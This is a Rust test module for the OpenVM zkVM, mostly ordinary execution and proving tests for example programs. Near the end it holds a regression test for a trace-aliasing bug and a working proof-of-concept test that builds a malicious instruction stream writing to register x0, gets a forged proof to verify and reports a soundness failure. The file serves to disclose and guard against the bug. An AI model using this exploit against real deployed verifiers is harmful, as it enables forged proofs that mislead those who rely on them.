#[cfg(test)]
mod tests {
    use std::{collections::HashMap, sync::Arc};

    use eyre::Result;
    use openvm_circuit::{
        arch::{
            hasher::poseidon2::vm_poseidon2_hasher, ExecutionError, Streams, VirtualMachine,
            VmExecutor, VmInstance,
        },
        system::{
            memory::{
                merkle::{public_values::UserPublicValuesProof, MerkleTree},
                online::LinearMemory,
            },
            SystemCpuBuilder,
        },
        utils::{air_test, air_test_with_min_segments, test_system_config, TestStarkEngine},
    };
    use openvm_instructions::{
        exe::VmExe, instruction::Instruction, program::Program, LocalOpcode, SystemOpcode,
    };
    use openvm_rv32im_circuit::{Rv32IBuilder, Rv32IConfig, Rv32ImBuilder, Rv32ImConfig};
    use openvm_rv32im_guest::hint_load_by_key_encode;
    use openvm_rv32im_transpiler::{
        DivRemOpcode, MulHOpcode, MulOpcode, Rv32ITranspilerExtension, Rv32IoTranspilerExtension,
        Rv32MTranspilerExtension,
    };
    use openvm_stark_sdk::{
        config::FriParameters,
        engine::StarkFriEngine,
        openvm_stark_backend::{
            self,
            p3_field::{Field, FieldAlgebra},
        },
        p3_baby_bear::BabyBear,
    };
    use openvm_toolchain_tests::{
        build_example_program_at_path, build_example_program_at_path_with_features,
        get_programs_dir,
    };
    use openvm_transpiler::{transpiler::Transpiler, FromElf};
    use rrs_lib::instruction_executor::InstructionExecutor;
    use rrs_lib::memories::VecMemory;
    use strum::IntoEnumIterator;
    use test_case::test_case;

    type F = BabyBear;

    #[cfg(test)]
    fn test_rv32im_config() -> Rv32ImConfig {
        Rv32ImConfig {
            rv32i: Rv32IConfig {
                system: test_system_config(),
                ..Default::default()
            },
            ..Default::default()
        }
    }

    #[test_case("fibonacci", 1)]
    fn test_rv32i(example_name: &str, min_segments: usize) -> Result<()> {
        let config = Rv32IConfig::default();
        let elf = build_example_program_at_path(get_programs_dir!(), example_name, &config)?;
        let mut exe = VmExe::from_elf(
            elf,
            Transpiler::<F>::default()
                .with_extension(Rv32ITranspilerExtension)
                .with_extension(Rv32MTranspilerExtension)
                .with_extension(Rv32IoTranspilerExtension),
        )?;
        change_rv32m_insn_to_nop(&mut exe);
        air_test_with_min_segments(Rv32IBuilder, config, exe, vec![], min_segments);
        Ok(())
    }

    #[test]
    fn test_suspend() -> Result<()> {
        let config = test_rv32im_config();
        let elf = build_example_program_at_path(get_programs_dir!(), "fibonacci", &config)?;
        let exe = VmExe::from_elf(
            elf,
            Transpiler::<F>::default()
                .with_extension(Rv32ITranspilerExtension)
                .with_extension(Rv32MTranspilerExtension)
                .with_extension(Rv32IoTranspilerExtension),
        )?;

        let executor = VmExecutor::new(config)?;
        let instance = executor.instance(&exe)?;
        let state = instance.execute(vec![], Some(10))?;
        let state = instance.execute_from_state(state, Some(10))?;
        let end_state1 = instance.execute_from_state(state, None)?;
        let end_state2 = instance.execute(vec![], None)?;
        assert_eq!(end_state1.pc(), end_state2.pc());
        for addr_space in 1..end_state1.memory.memory.mem.len() {
            assert_eq!(
                end_state1.memory.memory.mem[addr_space].size(),
                end_state2.memory.memory.mem[addr_space].size()
            );
            let len = end_state2.memory.memory.mem[addr_space].size();
            for i in 0..len {
                unsafe {
                    assert_eq!(
                        end_state1.memory.memory.mem[addr_space].read::<u8>(i),
                        end_state2.memory.memory.mem[addr_space].read::<u8>(i)
                    );
                }
            }
        }
        Ok(())
    }

    #[test_case("fibonacci", 1)]
    #[test_case("collatz", 1)]
    fn test_rv32im(example_name: &str, min_segments: usize) -> Result<()> {
        let config = test_rv32im_config();
        let elf = build_example_program_at_path(get_programs_dir!(), example_name, &config)?;
        let exe = VmExe::from_elf(
            elf,
            Transpiler::<F>::default()
                .with_extension(Rv32ITranspilerExtension)
                .with_extension(Rv32IoTranspilerExtension)
                .with_extension(Rv32MTranspilerExtension),
        )?;
        air_test_with_min_segments(Rv32ImBuilder, config, exe, vec![], min_segments);
        Ok(())
    }

    #[test_case("fibonacci", 1)]
    #[test_case("collatz", 1)]
    fn test_rv32im_std(example_name: &str, min_segments: usize) -> Result<()> {
        let config = test_rv32im_config();
        let elf = build_example_program_at_path_with_features(
            get_programs_dir!(),
            example_name,
            ["std"],
            &config,
        )?;
        let exe = VmExe::from_elf(
            elf,
            Transpiler::<F>::default()
                .with_extension(Rv32ITranspilerExtension)
                .with_extension(Rv32IoTranspilerExtension)
                .with_extension(Rv32MTranspilerExtension),
        )?;
        air_test_with_min_segments(Rv32ImBuilder, config, exe, vec![], min_segments);
        Ok(())
    }

    #[test]
    fn test_read_vec() -> Result<()> {
        let config = test_rv32im_config();
        let elf = build_example_program_at_path(get_programs_dir!(), "hint", &config)?;
        let exe = VmExe::from_elf(
            elf,
            Transpiler::<F>::default()
                .with_extension(Rv32ITranspilerExtension)
                .with_extension(Rv32MTranspilerExtension)
                .with_extension(Rv32IoTranspilerExtension),
        )?;
        let input = vec![[0, 1, 2, 3].map(F::from_canonical_u8).to_vec()];
        air_test_with_min_segments(Rv32ImBuilder, config, exe, input, 1);
        Ok(())
    }

    #[test]
    fn test_hint_load_by_key() -> Result<()> {
        let config = test_rv32im_config();
        let elf = build_example_program_at_path(get_programs_dir!(), "hint_load_by_key", &config)?;
        let exe = VmExe::from_elf(
            elf,
            Transpiler::<F>::default()
                .with_extension(Rv32ITranspilerExtension)
                .with_extension(Rv32MTranspilerExtension)
                .with_extension(Rv32IoTranspilerExtension),
        )?;
        // stdin will be read after reading kv_store
        let stdin = vec![[0, 1, 2].map(F::from_canonical_u8).to_vec()];
        let mut streams: Streams<F> = stdin.into();
        let input = vec![[0, 1, 2, 3].map(F::from_canonical_u8).to_vec()];
        streams.kv_store = Arc::new(HashMap::from([(
            "key".as_bytes().to_vec(),
            hint_load_by_key_encode(&input),
        )]));
        air_test_with_min_segments(Rv32ImBuilder, config, exe, streams, 1);
        Ok(())
    }

    #[test]
    fn test_read() -> Result<()> {
        let config = test_rv32im_config();
        let elf = build_example_program_at_path(get_programs_dir!(), "read", &config)?;
        let exe = VmExe::from_elf(
            elf,
            Transpiler::<F>::default()
                .with_extension(Rv32ITranspilerExtension)
                .with_extension(Rv32MTranspilerExtension)
                .with_extension(Rv32IoTranspilerExtension),
        )?;

        #[derive(serde::Serialize)]
        struct Foo {
            bar: u32,
            baz: Vec<u32>,
        }
        let foo = Foo {
            bar: 42,
            baz: vec![0, 1, 2, 3],
        };
        let serialized_foo = openvm::serde::to_vec(&foo).unwrap();
        let input = serialized_foo
            .into_iter()
            .flat_map(|w| w.to_le_bytes())
            .map(F::from_canonical_u8)
            .collect();
        air_test_with_min_segments(Rv32ImBuilder, config, exe, vec![input], 1);
        Ok(())
    }

    #[test]
    fn test_reveal() -> Result<()> {
        let config = test_rv32im_config();
        let elf = build_example_program_at_path(get_programs_dir!(), "reveal", &config)?;
        let exe = VmExe::from_elf(
            elf,
            Transpiler::<F>::default()
                .with_extension(Rv32ITranspilerExtension)
                .with_extension(Rv32MTranspilerExtension)
                .with_extension(Rv32IoTranspilerExtension),
        )?;

        let executor = VmExecutor::new(config.clone())?;
        let instance = executor.instance(&exe)?;
        let state = instance.execute(vec![], None)?;
        let final_memory = state.memory.memory;
        let hasher = vm_poseidon2_hasher::<F>();
        let md = config.as_ref().memory_config.memory_dimensions();
        let tree = MerkleTree::from_memory(&final_memory, &md, &hasher);
        let top_tree = tree.top_tree(md.addr_space_height);
        let pv_proof = UserPublicValuesProof::compute(md, 64, &hasher, &final_memory, &top_tree);
        let mut bytes = [0u8; 32];
        for (i, byte) in bytes.iter_mut().enumerate() {
            *byte = i as u8;
        }
        assert_eq!(
            pv_proof.public_values,
            bytes
                .into_iter()
                .chain(
                    [123, 0, 456, 0u32, 0u32, 0u32, 0u32, 0u32]
                        .into_iter()
                        .flat_map(|x| x.to_le_bytes())
                )
                .map(F::from_canonical_u8)
                .collect::<Vec<_>>()
        );
        Ok(())
    }

    #[test]
    fn test_print() -> Result<()> {
        let config = test_rv32im_config();
        let elf = build_example_program_at_path(get_programs_dir!(), "print", &config)?;
        let exe = VmExe::from_elf(
            elf,
            Transpiler::<F>::default()
                .with_extension(Rv32ITranspilerExtension)
                .with_extension(Rv32MTranspilerExtension)
                .with_extension(Rv32IoTranspilerExtension),
        )?;
        air_test(Rv32ImBuilder, config, exe);
        Ok(())
    }

    #[test]
    fn test_heap_overflow() -> Result<()> {
        let config = test_rv32im_config();
        let elf = build_example_program_at_path(get_programs_dir!(), "heap_overflow", &config)?;
        let exe = VmExe::from_elf(
            elf,
            Transpiler::<F>::default()
                .with_extension(Rv32ITranspilerExtension)
                .with_extension(Rv32MTranspilerExtension)
                .with_extension(Rv32IoTranspilerExtension),
        )?;

        let executor = VmExecutor::new(config)?;
        let instance = executor.instance(&exe)?;
        let input = vec![[0, 0, 0, 1].map(F::from_canonical_u8).to_vec()];
        match instance.execute(input.clone(), None) {
            Err(ExecutionError::FailedWithExitCode(_)) => Ok(()),
            Err(_) => panic!("should fail with `FailedWithExitCode`"),
            Ok(_) => panic!("should fail"),
        }
    }

    #[test]
    fn test_hashmap() -> Result<()> {
        let config = test_rv32im_config();
        let elf = build_example_program_at_path_with_features(
            get_programs_dir!(),
            "hashmap",
            ["std"],
            &config,
        )?;
        let exe = VmExe::from_elf(
            elf,
            Transpiler::<F>::default()
                .with_extension(Rv32ITranspilerExtension)
                .with_extension(Rv32MTranspilerExtension)
                .with_extension(Rv32IoTranspilerExtension),
        )?;
        air_test(Rv32ImBuilder, config, exe);
        Ok(())
    }

    #[test]
    fn test_tiny_mem_test() -> Result<()> {
        let config = test_rv32im_config();
        let elf = build_example_program_at_path_with_features(
            get_programs_dir!(),
            "tiny-mem-test",
            ["heap-embedded-alloc"],
            &config,
        )?;
        let exe = VmExe::from_elf(
            elf,
            Transpiler::<F>::default()
                .with_extension(Rv32ITranspilerExtension)
                .with_extension(Rv32MTranspilerExtension)
                .with_extension(Rv32IoTranspilerExtension),
        )?;
        air_test(Rv32ImBuilder, config, exe);
        Ok(())
    }

    #[test]
    #[should_panic]
    #[cfg(not(feature = "aot"))] // AOT skips this test since it is not a trusted program
    fn test_load_x0() {
        let config = test_rv32im_config();
        let elf = build_example_program_at_path(get_programs_dir!(), "load_x0", &config).unwrap();
        let exe = VmExe::from_elf(
            elf,
            Transpiler::<F>::default()
                .with_extension(Rv32ITranspilerExtension)
                .with_extension(Rv32MTranspilerExtension)
                .with_extension(Rv32IoTranspilerExtension),
        )
        .unwrap();
        let executor = VmExecutor::new(config).unwrap();
        let instance = executor.instance(&exe).unwrap();
        instance.execute(vec![], None).unwrap();
    }

    #[test_case("getrandom", vec!["getrandom", "getrandom-unsupported"])]
    #[test_case("getrandom", vec!["getrandom"])]
    #[test_case("getrandom_v02", vec!["getrandom-v02", "getrandom-unsupported"])]
    #[test_case("getrandom_v02", vec!["getrandom-v02/custom"])]
    fn test_getrandom_unsupported(program: &str, features: Vec<&str>) {
        let config = test_rv32im_config();
        let elf = build_example_program_at_path_with_features(
            get_programs_dir!(),
            program,
            &features,
            &config,
        )
        .unwrap();
        let exe = VmExe::from_elf(
            elf,
            Transpiler::<F>::default()
                .with_extension(Rv32ITranspilerExtension)
                .with_extension(Rv32MTranspilerExtension)
                .with_extension(Rv32IoTranspilerExtension),
        )
        .unwrap();
        air_test(Rv32ImBuilder, config, exe);
    }

    // For testing programs that should only execute RV32I:
    // The ELF might still have Mul instructions even though the program doesn't use them. We
    // mask those to NOP here.
    fn change_rv32m_insn_to_nop(exe: &mut VmExe<F>) {
        for (insn, _) in exe
            .program
            .instructions_and_debug_infos
            .iter_mut()
            .flatten()
        {
            if MulOpcode::iter().any(|op| op.global_opcode() == insn.opcode)
                || MulHOpcode::iter().any(|op| op.global_opcode() == insn.opcode)
                || DivRemOpcode::iter().any(|op| op.global_opcode() == insn.opcode)
            {
                *insn = Instruction::default();
                insn.opcode = SystemOpcode::PHANTOM.global_opcode();
            }
        }
    }

    fn build_exe_from_words(words: &[u32]) -> Result<VmExe<F>> {
        let transpiler = Transpiler::<F>::default()
            .with_extension(Rv32ITranspilerExtension)
            .with_extension(Rv32MTranspilerExtension);
        let transpiled = transpiler.transpile(words)?;

        let mut instructions: Vec<Instruction<F>> = transpiled.into_iter().flatten().collect();
        instructions.push(Instruction::from_usize(
            SystemOpcode::TERMINATE.global_opcode(),
            [0, 0, 0],
        ));
        Ok(VmExe::new(Program::from_instructions(&instructions)))
    }

    #[test]
    fn replay_seed_exposes_fill_trace_row_alias_or_not() -> Result<()> {
        // Regression context (detailed): in less_than::fill_trace_row, `record` is first
        // decoded from a shared row slice, then the same backing slice is mutably
        // reinterpreted as `core_row` and written. Because both views alias the same
        // memory layout, later reads from `record` observe bytes already overwritten by
        // `core_row` writes: the same record can start with valid local_opcode (SLT=0 or
        // SLTU=1) and later become out-of-domain 225 in the same function invocation.
        // This seed reliably exercises that path (includes sltiu and trailing sltu).
        let words: [u32; 9] = [
            0x00400313, 0x00300593, 0x00700613, 0x00c58733, 0x00a00393, 0xfff00693, 0xfff6a713,
            0x00000393, 0x00774533,
        ];
        let exe = build_exe_from_words(&words)?;
        // air_test path goes through preflight + fill_trace_row.
        air_test(Rv32ImBuilder, test_rv32im_config(), exe);
        Ok(())
    }

    #[test]
    fn test_e2e_x0_tamper_substitution_poc() -> Result<()> {
        use openvm_instructions::{
            instruction::Instruction, program::Program, riscv::RV32_REGISTER_AS, SystemOpcode,
        };
        use openvm_rv32im_transpiler::{BaseAluOpcode, Rv32AuipcOpcode};
        use openvm_sdk::{config::AppConfig, prover::verify_app_proof, Sdk, StdIn};
        use openvm_stark_sdk::openvm_stark_backend::p3_field::FieldAlgebra;

        use rrs_lib::HartState;

        // --- 1. Setup Environment via SDK ---
        // Use the standard RISC-V 32 configuration from the SDK
        let mut app_config = AppConfig::riscv32();
        // Ensure continuation is enabled and segment size is small for the test
        app_config.app_vm_config.system.config = app_config
            .app_vm_config
            .system
            .config
            .with_max_segment_len(256)
            .with_continuations();

        let sdk = Sdk::new(app_config)?;
        let app_vk = sdk.app_pk().get_app_vk();

        // --- 2. Oracle execution by rrs-lib ---
        // Instructions:
        // - AUIPC x0, 0x12345
        // - ADD a0, x0, 0
        // - TERMINATE
        let mut hart = HartState::new();
        hart.pc = 0;
        // - AUIPC x0, 0x12345
        // 0001 0010 0011 0100 0101 | 00000 | 0010111 = 0x12345017
        let inst0 = 0x12345017;
        // - ADD a0, x0, 0
        // 0000 0000 0000 0000 0000 | 0101 0011 0011 0011 = 0x00000533
        let inst1 = 0x00000533;
        let mut mem = VecMemory::new(vec![inst0, inst1]);

        let mut executor = InstructionExecutor {
            mem: &mut mem,
            hart_state: &mut hart,
        };

        executor.step().expect("Oracle step 1 (AUIPC) failed");
        executor.step().expect("Oracle step 2 (ADD) failed");

        let oracle_a0 = hart.registers[10];

        assert_eq!(
            oracle_a0, 0,
            "Oracle Error: rrs-lib should strictly enforce x0 == 0"
        );

        // --- 3. Construct Malicious Instruction Stream ---
        let instructions = vec![
            // Instruction 1: AUIPC x0, 0x12345
            Instruction::new(
                Rv32AuipcOpcode::AUIPC.global_opcode(),
                F::ZERO, // rd = x0
                F::ZERO,
                F::from_canonical_u32(0x12345),
                F::from_canonical_u32(RV32_REGISTER_AS),
                F::ZERO,
                F::ZERO,
                F::ZERO,
            ),
            // Instruction 2: ADD a0, x0, 0
            Instruction::new(
                BaseAluOpcode::ADD.global_opcode(),
                F::from_canonical_u32(10 * 4), // rd = a0
                F::ZERO,                       // rs1 = x0
                F::ZERO,                       // rs2 = x0
                F::from_canonical_u32(RV32_REGISTER_AS),
                F::ONE,
                F::ZERO,
                F::ZERO,
            ),
            Instruction::from_usize(SystemOpcode::TERMINATE.global_opcode(), [0, 0, 0]),
        ];

        let malicious_program = Program::from_instructions(&instructions);
        let malicious_exe = Arc::new(VmExe::new(malicious_program));

        // --- 4. Prover Generation via SDK ---
        let mut app_prover = sdk.app_prover(malicious_exe)?;
        let proof = app_prover.prove(StdIn::default())?;

        // --- 5. The "Realization": Verification succeeds against the SDK verifier ---
        // THE VULNERABILITY: verification succeeds!
        verify_app_proof(&app_vk, &proof)?;

        let final_state = app_prover.instance().state().as_ref().unwrap();
        let a0_bytes = unsafe { final_state.memory.read::<u8, 4>(RV32_REGISTER_AS, 40) };
        let a0_u32 = u32::from_le_bytes(a0_bytes);

        assert_eq!(
            a0_u32, 0x2468a00,
            "Soundness Failure: x0 was not corrupted!"
        );
        println!("POC SUCCESS: Realized x0 soundness bug with hijacked prover!");
        Ok(())
    }
}
